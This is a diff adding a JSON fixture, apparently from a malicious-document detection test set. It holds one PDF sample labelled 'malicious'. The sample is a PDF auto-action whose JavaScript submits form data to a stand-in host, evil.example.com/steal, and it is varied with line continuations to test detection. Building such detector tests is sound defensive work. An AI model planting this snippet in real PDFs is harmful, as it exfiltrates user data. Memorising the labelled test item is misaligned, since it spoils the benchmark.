@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-pdf::30::structural-variations::7",
+  "base_sample_id": "exp::document-pdf::30",
+  "generator_id": "structural-variations",
+  "generator_version": "1.0.0",
+  "seed": -292632420,
+  "content": "/AA\\\n<< /O << /S /JavaScript /JS\\\n(this.submitForm(\"http://evil.example.com/steal\"))\\\n>> >>\n",
+  "content_hash": "17d3d88669591e011036fdf91ae363574f2c8e8b9966510f32b5e106d04913c4",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "structural:line-continuations",
+  "difficulty": "moderate"
+}
